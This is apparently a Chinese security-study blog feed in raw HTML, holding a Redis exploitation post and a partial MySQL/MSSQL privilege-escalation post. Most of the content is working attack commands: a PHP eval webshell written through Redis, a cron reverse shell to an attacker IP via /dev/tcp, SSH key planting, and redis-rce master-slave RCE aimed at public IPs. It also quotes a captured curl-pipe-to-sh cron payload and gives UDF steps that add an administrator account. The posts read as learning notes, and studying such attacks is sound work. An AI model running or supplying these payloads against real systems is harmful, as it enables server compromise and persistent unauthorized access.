shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">redis连接远程服务器:</span></span><br><span class="line">redis-cli -h host -p port -a password</span><br><span class="line">set testkey &quot;Hello World&quot;          # 设置键testkey的值为字符串</span><br><span class="line">get testkey                        # 获取键testkey的内容</span><br><span class="line">set score 99                       # 设置键score的值为99</span><br><span class="line">incr score                         # 使用INCR命令将score的值增加1</span><br><span class="line">get score                          # 获取键score的内容</span><br><span class="line">keys *                             # 列出当前数据库中所有的键</span><br><span class="line">get anotherkey                     # 获取一个不存在的键的值</span><br><span class="line"> </span><br><span class="line">config set dir /home/test          # 设置工作目录</span><br><span class="line">config set dbfilename redis.rdb    # 设置备份文件名</span><br><span class="line">config get dir                     # 检查工作目录是否设置成功</span><br><span class="line">config get dbfilename              # 检查备份文件名是否设置成功</span><br><span class="line">save                               # 进行一次备份操作,将所有键值对保存到工作目录下备份文件里！！！</span><br><span class="line">flushall                           # 删除所有数据</span><br><span class="line">del key                            # 删除键为key的数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ping                               #检测是否连通且有权限执行命令</span><br><span class="line">info                               #查看redis配置信息</span><br><span class="line">slaveof                            # slaveof&lt;vpsIP&gt;PORT 设置主从关系</span><br></pre></td></tr></table></figure><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h3 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h3><blockquote><p>Redis 服务默认监听在6379端口上</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MongoDB：27017</span><br><span class="line">Memcached：11211 </span><br><span class="line">Jboss：8080</span><br><span class="line">VNC：5900、5901</span><br><span class="line">Docker：2375</span><br></pre></td></tr></table></figure><h3 id="端口探测查找漏洞"><a href="#端口探测查找漏洞" class="headerlink" title="端口探测查找漏洞"></a>端口探测查找漏洞</h3><blockquote><p>进行信息收集，寻找可能利用的点<br>通过nmap进行端口扫描，发现端口开放：</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -v -Pn -p 6379 -sV 124.223.217.243</span><br><span class="line">-v：显示过程</span><br><span class="line">-Pn：no ping</span><br><span class="line">-sV：版本探测</span><br><span class="line">124.223.217.243:6379我的VPS</span><br><span class="line"></span><br><span class="line">nmap -sV -p- -T4 47.104.255.11</span><br></pre></td></tr></table></figure><p>若是探测到6379端口，则下载客户端去尝试连接服务端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 47.104.255.11 -p 6379</span><br></pre></td></tr></table></figure><p>连接后使用AUTH或者info检验回显，检查是否有未授权漏洞</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209242114906.png" alt="image-20220924211422658" style="zoom: 50%;" /><blockquote><p>那么如何批量检测呢？</p></blockquote><h2 id="Redis历史漏洞"><a href="#Redis历史漏洞" class="headerlink" title="Redis历史漏洞"></a>Redis历史漏洞</h2><h3 id="Redis未授权访问-1"><a href="#Redis未授权访问-1" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h3><blockquote><p>因配置不当可以未经授权访问，攻击者无需认证就可以访问到内部数据。</p><ol><li>导致敏感信息泄露</li><li>执行 flushall 可清空所有数据</li><li>通过数据备份功能（save）往磁盘写入后门文件（webshell、定时任务），通过键值对方式</li><li>如果Redis以root身份运行，可以给root账户写入SSH公钥文件，免密码登录</li></ol></blockquote><h3 id="Redis主从复制RCE"><a href="#Redis主从复制RCE" class="headerlink" title="Redis主从复制RCE"></a>Redis主从复制RCE</h3><blockquote><p>在 Reids 4.x 之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过c语言编译并加载恶意.so文件，达到代码执行的目的</p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#服务端 redis-server</span></span><br><span class="line">docker pull medicean/vulapps:r_redis_1</span><br><span class="line">docker run -dit -p 6379:6379 -p 2222:22 medicean/vulapps:r_redis_1</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装 redis-cli  客户端</span></span><br><span class="line"><span class="comment">#1. 包管理器安装</span></span><br><span class="line">apt install redis-tools</span><br><span class="line"><span class="comment">#2. 源码安装</span></span><br><span class="line">wget http://download.redis.io/releases/redis-6.0.3.tar.gz</span><br><span class="line">tar -zxvf redis-6.0.3.tar.gz    <span class="comment">#解压</span></span><br><span class="line"><span class="built_in">cd</span> redis-6.0.3/</span><br><span class="line">make   <span class="comment">#编译</span></span><br><span class="line"><span class="built_in">cd</span> src/</span><br><span class="line"><span class="built_in">cp</span> redis-cli /usr/bin   <span class="comment">#客户端连接程序添加到bin中，可以命令行直接调用</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用方法-三种总览）"><a href="#漏洞利用方法-三种总览）" class="headerlink" title="漏洞利用方法(三种总览）"></a>漏洞利用方法(三种总览）</h3><blockquote><ol><li><p>通过redis数据备份功能结合WEB服务，往WEB网站根目录写入一句话木马，从而得到WEB网站权限</p></li><li><p>通过redis数据备份功能写定时任务，通过定时任务反弹Shell</p></li><li><p>通过redis数据备份功能写SSH公钥，实现免密登录linux服务器(需要root权限)</p></li></ol></blockquote><h4 id="第一种利用：写webshell"><a href="#第一种利用：写webshell" class="headerlink" title="第一种利用：写webshell"></a>第一种利用：写webshell</h4><h5 id="利用条件-x2F-前提"><a href="#利用条件-x2F-前提" class="headerlink" title="利用条件&#x2F;前提"></a>利用条件&#x2F;前提</h5><blockquote><ol><li>知道网站根目录绝对路径</li><li>对目标网站根目录有写入权限</li></ol></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">redis-cli -h 10.1.1.200 -p 6379</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><blockquote><p>注意：设置键值为一句话木马时，可以使用如下形式：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> x<span class="string">&quot;\r\n\r\n&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;cmd&#x27;]);?&gt;\r\n\r\n&quot;</span></span><br></pre></td></tr></table></figure><p>解释：”\r\n\r\n” 表示换行，用Redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</p></blockquote><h4 id="第二种利用：写定时任务反弹shell"><a href="#第二种利用：写定时任务反弹shell" class="headerlink" title="第二种利用：写定时任务反弹shell"></a>第二种利用：写定时任务反弹shell</h4><blockquote><p>关于定时任务crontab，之前写过一篇文章:<a href="https://11pmsleep.github.io/2022-09-24-%E7%9F%A5%E8%AF%86/Linux/Linux-Crontab%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/">Linux-Crontab 计划任务</a></p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#10.1.1.200是被控端,也就是服务端</span></span><br><span class="line"><span class="comment">#10.1.1.100是攻击者</span></span><br><span class="line">redis-cli -h 10.1.1.200 -p 6379</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; </span></span><br><span class="line"><span class="string">/dev/tcp/10.1.1.100/4433 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><blockquote><p>说明：<br>关于<code>\n\n*/1 * * * * /bin/bash -i&gt;&amp; /dev/tcp/10.1.1.100/4433 0&gt;&amp;1\n\n</code><br>\n是换行，*&#x2F;1 * * * <em>是定时任务，因为要写定时任务，所以需要单独一行，使用\n<br>在</em>&#x2F;1 * * * <em>里面，</em>&#x2F;1表示每个一分钟就去执行一遍下面的任务<br><code>/bin/bash -i &gt;&amp; /dev/tcp/10.1.1.100/4433 0&gt;&amp;1</code>        #就是反弹shell的命令</p></blockquote><h4 id="第三种利用：写SSH公钥"><a href="#第三种利用：写SSH公钥" class="headerlink" title="第三种利用：写SSH公钥"></a>第三种利用：写SSH公钥</h4><blockquote><p>（redis需要有root权限）前提是redis具有root权限，这样才可以将公钥写入&#x2F;root&#x2F;.ssh 文件夹的authotrized_keys文件中。</p><p><strong>注意：</strong>关于写公钥登录是获得完整shell的方法，而且不像写脚本getshell那样会被检测出来</p></blockquote><h5 id="关于ssh密钥登陆"><a href="#关于ssh密钥登陆" class="headerlink" title="关于ssh密钥登陆"></a>关于ssh密钥登陆</h5><blockquote><p>root&#x2F;.ssh&#x2F;authorized_keys下面存放的就是所有公钥，有公钥即可无密码登录</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">默认情况下，生成的SSH密钥在用户家目录的 .ssh 目录下</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /tmp/foo.txt</span><br><span class="line">cat /tmp/foo.txt | redis-cli -h 192.168.1.100 -p 6379 -x set m</span><br><span class="line">redis-cli -h 192.168.1.100 -p 6379</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br><span class="line">ssh root@139.9.198.30 -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure><blockquote><p>说明：<br><code>(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /tmp/foo.txt</code></p><blockquote><p><code>echo -e &quot;\n\n&quot;</code>里面，-e选项时，若字符串中转义字符，则特别加以处理，而不会将它当成一般文字输出<br>即表示此时输出两个回车换行<br>再在屏幕上cat ~&#x2F;.ssh&#x2F;id_rsa.pub，再加两个换行<br>最后将文件写入&#x2F;tmp&#x2F;foo.txt文件</p></blockquote><p><code>cat /tmp/foo.txt | redis-cli -h 192.168.1.100 -p 6379 -x set m</code></p><blockquote><p>就是将键值m设置为foo.txt里面内容</p></blockquote></blockquote><h3 id="主从复制RCE（前面有介绍主从复制）"><a href="#主从复制RCE（前面有介绍主从复制）" class="headerlink" title="主从复制RCE（前面有介绍主从复制）"></a>主从复制RCE（前面有介绍主从复制）</h3><p>主从复制实验可以使用老师的这个环境124.71.45.28</p><blockquote><p>nmap扫出结果：发现高于4.x版本，故有主从复制rce漏洞</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">6379/tcp open  redis   Redis key-value store 5.0.5</span><br></pre></td></tr></table></figure><p>在 Reids 4.x 之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写C语言并编译出 .so 文件。所以，我们可以</p><ol><li>手动编译 so 扩展文件（类似Windows的ddl）（不需要知道怎么写）</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编译生成so扩展文件</span></span><br><span class="line"><span class="built_in">cd</span> /root/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/puckiestyle/RedisModules-ExecuteCommand</span><br><span class="line"><span class="built_in">cd</span> RedisModules-ExecuteCommand</span><br><span class="line">make</span><br></pre></td></tr></table></figure><ol start="2"><li>脚本利用Redis主从复制RCE</li></ol><blockquote><ul><li><p><a href="https://github.com/puckiestyle/RedisModules-ExecuteCommand">https://github.com/puckiestyle/RedisModules-ExecuteCommand</a></p></li><li><p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p></li><li><p><a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p></li><li><p><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p></li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/</span><br><span class="line">git clone https://github.com/Ridter/redis-rce</span><br><span class="line">cd redis-rce</span><br><span class="line">python3 -m pip install -r requirements.txt</span><br><span class="line">cp /root/RedisModules-ExecuteCommand/module.so ./module.so</span><br><span class="line">python3 redis-rce.py -r 124.71.45.28 -p 6379 -L 124.223.217.243  </span><br><span class="line">-P 7890 -f module.so</span><br></pre></td></tr></table></figure><blockquote><p>解释：<br>-r 124.71.45.28 -p 6379 未授权主机的信息<br>-L 47.104.255.11 本地主机<br>-P 7890当前主机信息和端口<br>相当于创建一个假的redis服务器，有服务器的一些功能，监听攻击机的7890端口<br>脚本创建的假的服务器<br><code>cp /root/RedisModules-ExecuteCommand/module.so ./module.so</code>就是将编译的so扩展文件复制到我们假的redis主服务器上</p></blockquote><p><strong>注意事项：</strong>自己曾经犯的一个错误：</p><blockquote><p>注意：此时主机用内网地址进行攻击时（也就是虚拟redis主机）此时！，从机是无法访问我们的内网的主机的！！！</p><p>所以才会报错！！！！</p><p>实验环境建议都是具有公网ip地址的主机，将文件复制到我的vps124.223.217.243</p><p>还有！！不要忘记打开VPS的防火墙</p></blockquote><p>继续实验。连接成功</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209250020639.png" alt="image-20220925001817232" style="zoom: 50%;" /><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#关于redis假主机py脚本的说明：</span></span><br><span class="line">python3 redis-rce.py -r 124.71.45.28 -p 6379 -L 124.223.217.243  -P 7890 -f module.so</span><br><span class="line"><span class="comment"># Redis RCE</span></span><br><span class="line">A exploit <span class="keyword">for</span> Redis 4.x/5.x RCE, inspired by [Redis post-exploitation]</span><br><span class="line"></span><br><span class="line">usage: redis-rce.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] [-f FILE] [-a AUTH] [-v]</span><br><span class="line"></span><br><span class="line">Redis 4.x/5.x RCE with RedisModules</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>             show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -r RHOST, --rhost RHOST    target host</span><br><span class="line">  -p RPORT, --rport RPORT    target redis port, default 6379</span><br><span class="line">  -L LHOST, --lhost LHOST    rogue server ip</span><br><span class="line">  -P LPORT, --lport LPORT    rogue server listen port, default 21000</span><br><span class="line">  -f FILE, --file FILE   RedisModules to load, default exp.so</span><br><span class="line">  -a AUTH, --auth AUTH    redis password</span><br><span class="line">  -v, --verbose          show more info</span><br></pre></td></tr></table></figure><ol start="3"><li>执行命令</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 124.71.45.28 -p 6379</span><br><span class="line">config get dir</span><br><span class="line">config get dbfilename</span><br><span class="line">system.exec &quot;whoami&quot;</span><br></pre></td></tr></table></figure><h4 id="脚本原理"><a href="#脚本原理" class="headerlink" title="脚本原理"></a>脚本原理</h4><ol><li>首先连接目标未授权redis服务</li><li>发送配置主从模式的命令到目标redis服务</li></ol><blockquote><p>脚本在靶机上执行命令如下：</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">slaveof 47.104.255.11 7890           <span class="comment">#设置主机为此机器（我们创建的假的redis主机），执行命令的就是从机</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename module.so</span><br></pre></td></tr></table></figure><ol start="3"><li><p>监听 124.71.45.28:7890 作为 redis 主机</p></li><li><p>目标机器(从机)从主机复制 module.so 内容保存到 redis 服务器的 module.so文件中</p></li><li><p>目标机器加载 module.so 扩展模块(1.55.10)</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MODULE LOAD ./module.so</span><br></pre></td></tr></table></figure><ol start="6"><li>执行命令</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system.exec &quot;命令&quot;</span><br></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ol><li>在学习redis的时候，docker搭建了redis环境，被公网上人估计了docker里面的redis，记录一下</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">124.223.217.243:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;backup2&quot;</span></span><br><span class="line">2) <span class="string">&quot;backup3&quot;</span></span><br><span class="line">3) <span class="string">&quot;backup1&quot;</span></span><br><span class="line">4) <span class="string">&quot;backup4&quot;</span></span><br><span class="line">47.104.255.11:6379&gt; get backup1</span><br><span class="line"><span class="string">&quot;\n\n\n*/2 * * * * root cd1 -fsSL http://en2an.top/cleanfda/init.sh | sh\n\n&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#可以看到被人在一个键中写入了一个恶意脚本，并且每隔两分钟进行复制一份,并且在定时任务中也写了东西</span></span><br><span class="line"><span class="comment">#去/etc/crontab查看        Linux下面定时任务目录，下面有详细介绍</span></span><br></pre></td></tr></table></figure><ol start="2"><li>利用fofa批量检测此类公网上的未授权漏洞</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209250026045.png" alt="image-20220925002619783" style="zoom:50%;" /><ol start="3"><li>复现其他1-2个未授权漏洞</li><li>编写未授权漏洞利用检测脚本</li></ol><blockquote><p>此脚本就可以批量检测公网有哪些机器具有未授权漏洞</p></blockquote><h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><blockquote><ul><li><p><a href="https://www.cnblogs.com/cxxjohnson/p/9072383.html">redis常用命令大全</a></p></li><li><p><a href="https://paper.seebug.org/975/">Redis 基于主从复制的 RCE 利用方式</a></p></li><li><p><a href="https://www.hetianlab.com/expc.do?ce=2afbad05-7336-4e91-b3b1-a6d3d08f7054">实验:Docker未授权访问漏洞</a></p></li><li><p><a href="https://www.hetianlab.com/expc.do?ce=108b84d0-2bf1-4606-9826-79ade46479a3">实验:Redis未授权访问漏洞</a></p></li><li><p><a href="https://www.hetianlab.com/expc.do?ce=2afbad05-7336-4e91-b3b1-a6d3d08f7054">实验:Docker未授权访问漏洞</a></p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
          <category> 历史漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0x24 - 应用程序提权</title>
      <link href="/2022-09-24-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x24-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/"/>
      <url>/2022-09-24-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x24-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="MYSQL提权"><a href="#MYSQL提权" class="headerlink" title="MYSQL提权"></a>MYSQL提权</h2><h2 id="Mysql提权利用场景"><a href="#Mysql提权利用场景" class="headerlink" title="Mysql提权利用场景"></a>Mysql提权利用场景</h2><ol><li>拥有数据库账号密码</li><li>Webshell可以连接数据库，能够写文件</li><li>可操作数据库</li></ol><h3 id="如何获取数据库账号密码"><a href="#如何获取数据库账号密码" class="headerlink" title="如何获取数据库账号密码?"></a>如何获取数据库账号密码?</h3><ol><li>找数据库配置文件</li><li>通过webshell对数据库进行本地爆破</li><li>Hash获取mysql密码</li></ol><!----><pre><code>F:\Haoran\download\Server\phpStudy_64\Extensions\MySQL5.7.26\data\mysql\user.MYD文件中包含用户密码的hash值16进制查看器即可打开看到再复制到md5解密网站去查找其真实的密码 </code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208050131849.png" alt="image-20220805013130703"></p><h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>udf提权指的是<strong>利用注入漏洞或其他漏洞</strong>获取了<strong>数据库操作权限</strong>后，通过数据库<strong>输出具有提权功能的文件</strong>并执行提权操作</p><h3 id="udf简介："><a href="#udf简介：" class="headerlink" title="udf简介："></a>udf简介：</h3><blockquote><p>DLL文件（Dynamic liked library动态链接库）简介<a href="https://www.bilibili.com/video/BV18Y4y1P7oK?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV18Y4y1P7oK?spm_id_from=333.337.search-card.all.click</a></p><p>程序在运行前会依次在<strong>exe程序目录、Windows系统目录、Windows目录、当前目录、path指定目录</strong>中查找需要调用的dll文件</p></blockquote><p><strong>user defined function</strong>，用户定义函数，为用户提供了一种高效创建函数的方式</p><p>攻击者编写调用系统cmd命令（linux下相当于调用shell命令）的udf.dll文件，并将udf.dll导出到<strong>指定目录</strong><br>下，攻击者创建一个指向udf.dll的自定义函数func，每次在数据库查询中执行func函数等价于在cmd命令中执<br>行命令。</p><p><strong>核心:Windows其</strong>服务一般是以system权限启动，通过mysql服务启动的cmd将会是system权限的。利用了root 高权限，创建带有调用cmd的函数的udf.dll动态链接库！</p><h3 id="DLL文件上传路径："><a href="#DLL文件上传路径：" class="headerlink" title="DLL文件上传路径："></a>DLL文件上传路径：</h3><pre><code>Windows2003：C:\windows\MySQL 5.1版本后：mysql安装目录\lib\plugin\目录下，一般来说是不存在的lib目录 需要自行创建</code></pre><h3 id="前置知识：ADS流"><a href="#前置知识：ADS流" class="headerlink" title="前置知识：ADS流"></a>前置知识：ADS流</h3><blockquote><p><a href="https://learnku.com/docs/server-learn/1.0/hide-files/13195#6824f8">https://learnku.com/docs/server-learn/1.0/hide-files/13195#6824f8</a></p></blockquote><p>在MySQL5.1以后的环境下只有将udf.dll文件导出到mysql安装目录<code>\lib\plugin\</code>目录下才能成功，但是很多时候mysql安装目录下并不存在lib目录，mysql文件操作也并不能直接创建目录，此时需要通过<strong>NTFS ADS流</strong>来创建目录。</p><p>NTFS ADS全称为<strong>NTFS交换数据流（NTFS Alternate Data Streams）</strong>，是NTFS文件系统的一个特性。NTFS文件系统中的每一个文件可以包括多个数据流，每个文件数据流的完整格式如下：</p><pre><code>&lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;&lt;文件名&gt;:&lt;流名&gt; :&lt;流种类&gt;</code></pre><ul><li><p>只有一个data流时，stream name通常可以省略，stream type也可以成为attribute type。</p></li><li><p>我们通常看到的是文件的data流，其它数据流都处于隐藏状态。</p></li><li><p>当attribute type为$INDEX_ALLOCATION 时，表明该该数据流的宿主是文件夹。</p></li></ul><p><strong>所以可以通过 mysql 导出数据到<code>directory_path(目录路径）:: $INDEX_ALLOCATION</code>文件的方法来创建directory_path目录。</strong></p><h4 id="DATA流创建"><a href="#DATA流创建" class="headerlink" title="#$DATA流创建"></a>#$DATA流创建</h4><ol><li>创建宿主文件</li></ol><!----><pre><code>echo &quot;this is a test file&quot; &gt; test.txt </code></pre><ol><li>关联数据流</li></ol><!----><pre><code>echo &quot;this is a ads file&quot; &gt; test.txt:aaa:$data 注释：test.txt:aaa:$data &lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;&lt;文件名&gt;  :&lt;流名&gt;          :&lt;流种类&gt;</code></pre><ol><li>查看test.txt文件，读取正常</li></ol><!----><pre><code>type test.txt &quot;this is a test file&quot; </code></pre><ol><li>查看流文件</li></ol><!----><pre><code>dir /r 2021/03/05  10:26                24 test.txt                                  23 test.txt:aaa:$DATA notepad test.txt:aaa 看不到文件内容</code></pre><ol><li>流文件无法直接删除，只能删除源文件</li></ol><!----><pre><code>del /f test.txt </code></pre><h4 id="ADS流文件应用"><a href="#ADS流文件应用" class="headerlink" title="ADS流文件应用"></a>ADS流文件应用</h4><ol><li>创建隐藏文件</li></ol><!----><pre><code>type pass.txt &gt; song.mp3:password:$DATA </code></pre><ol><li>$INDEX_ALLOCATION流创建文件夹 hellp</li></ol><!----><pre><code>echo  &gt; hello::$INDEX_ALLOCATION </code></pre><h3 id="前置知识：Mysql写文件及创建文件夹"><a href="#前置知识：Mysql写文件及创建文件夹" class="headerlink" title="前置知识：Mysql写文件及创建文件夹"></a>前置知识：Mysql写文件及创建文件夹</h3><h4 id="mysql写文件"><a href="#mysql写文件" class="headerlink" title="#mysql写文件"></a>#mysql写文件</h4><pre><code>select &#39;111&#39; into dumpfile &#39;D:\\1.txt&#39;; select &#39;111&#39; into outfile &#39;D:\1.txt&#39;; </code></pre><p>outfile函数可以导出多行，而dumpfile只能导出一行数据<br><strong>outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式</strong></p><h4 id="mysql创建文件夹"><a href="#mysql创建文件夹" class="headerlink" title="#mysql创建文件夹"></a>#mysql创建文件夹</h4><pre><code>select 233 into dumpfile &#39;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#39;; </code></pre><h3 id="UDF提权之前需要做的事情"><a href="#UDF提权之前需要做的事情" class="headerlink" title="UDF提权之前需要做的事情"></a>UDF提权之前需要做的事情</h3><ol><li>查看是否有写权限</li></ol><!----><pre><code>show global variables like &#39;secure%&#39;; secure_file_priv为空时表示我们有权限写入</code></pre><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208050136483.png" alt="image-20220805013601358" style /><ol><li>查看mysql安装路径和版本</li></ol><!----><pre><code>安装路径：show variables like &#39;%char%&#39;; select @@datadir; 版本：Select version(); </code></pre><ol><li>查看目标主机系统架构</li></ol><!----><pre><code>show variables like &#39;%compile%&#39;</code></pre><p>有x32和x64架构的dll文件选择</p><ol><li>查看plugin是否存在 （一般来说是不存在的 需要自行创建）</li></ol><!----><pre><code>show variables like &#39;plugin%&#39;;</code></pre><ol><li>通过ADS流的方式创建lib目录(如果能通过蚁剑工具创建目录，当然也是可以的)</li></ol><!----><pre><code>select 233 into dumpfile &#39;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#39;;  这里是Windows环境，需要对之进行转义所以用\\</code></pre><ol><li>提前准备好我们需要写入的udf.dll文件！</li></ol><p>在<code>&quot;F:\Learning\ComputerScience\Cyber Security\Tools-Hetian\Tools-Hetian\SQL注入\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_&quot;</code>目录下有sqlmap提供的udf提权文件！</p><h3 id="UDF提权步骤-开始写入文件"><a href="#UDF提权步骤-开始写入文件" class="headerlink" title="UDF提权步骤-开始写入文件"></a>UDF提权步骤-开始写入文件</h3><p>目标主机开启MySQL<strong>远程连接</strong>，并且攻击者已经获得MySQL数据库连接的用户名和密码信息（user.MDY文件)，通过udf手工提权获得操作系统管理员权限。</p><p>蚁剑shell会话右击，连接其数据库，输入用户名及密码，mysql或者mysqli的方式</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208050132309.png" alt="image-20220805013214093" style /><p>【在进行下面步骤之前需要先对mysql进行检验上一小节<strong>UDF提权之前需要做的事情</strong>中的一些东西】</p><ol><li>创建临时表：</li></ol><!----><pre><code>create table temp_udf(udf BLOB);  BLOB全称为Binary Large Objects,即大型二进制对象</code></pre><ol><li>将udf.dll二进制数据插入临时表temp_udf中，$binaryCode为udf.txt文件中复制的内容。</li></ol><!----><pre><code>insert into temp_udf values (CONVERT($binaryCode,CHAR)); </code></pre><ol><li>将udf.dll导出到mysql安装目录下的lib&#x2F;plugin&#x2F;udf.dll文件中:</li></ol><!----><pre><code>select udf from temp_udf into dumpfile &quot;C:/mysql/mysql-5.1.40-win32/lib/plugin/udf.dll&quot;或者直接写入字符串：select 0xString(替换成dll文件中的内容，别忘记前面加0x) into dumpfile &quot;C:/mysql/mysql-5.1.40-win32/lib/plugin/udf.dll&quot;</code></pre><ol><li>创建cmdshell或者sys_eval函数</li></ol><!----><pre><code>create function sys_eval returns string soname &#39;udf.dll’ </code></pre><ol><li>创建新用户添加到超级管理员组</li></ol><!----><pre><code>select sys_eval(&#39;net user udftester 123456 /add &amp; net localgroup administrators udftester /add’) </code></pre><ol><li>查看命令执行结果：</li></ol><!----><pre><code>select sys_eval(&#39;net localgroup administrators&#39;) </code></pre><ol><li>接下来就可以管理员身份登录</li><li>提权结束记得清除痕迹</li></ol><!----><pre><code>drop function sys_eval</code></pre><p><strong>注意：上面可以执行cmd命令，自然也可以执行powershell！我们自然就可以执行powershell脚本上线cs</strong></p><h2 id="msf自动利用"><a href="#msf自动利用" class="headerlink" title="#msf自动利用"></a>#msf自动利用</h2><pre><code>mysql允许外联才可以使用：exploit/multi/mysql/mysql_udf_payload</code></pre><h1 id="MSSQL提权"><a href="#MSSQL提权" class="headerlink" title="MSSQL提权"></a>MSSQL提权</h1><h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><p>msdn安装环境：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208050737596.png" alt="image-20220805073752311"></p><p>一直next即可安装成功！</p><h2 id="Mssql角色用户权限"><a href="#Mssql角色用户权限" class="headerlink" title="Mssql角色用户权限"></a>Mssql角色用户权限</h2><p><strong>（注意最后一个sysadmin，相当于administrator和root的权限）</strong></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290725579.png" alt="image-20220729072543419"></p><h3 id="Mssql常用命令"><a href="#Mssql常用命令" class="headerlink" 